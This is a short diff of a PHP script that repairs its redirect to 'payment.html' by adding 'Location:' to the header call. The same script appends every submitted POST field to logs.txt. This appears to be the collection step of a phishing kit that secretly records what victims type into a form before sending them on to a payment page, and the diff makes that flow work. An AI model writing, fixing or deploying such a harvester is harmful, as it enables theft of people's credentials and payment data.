@@ -1,5 +1,5 @@
 <?php
-header ('payment.html');
+header ('Location: payment.html');
 $handle = fopen("logs.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
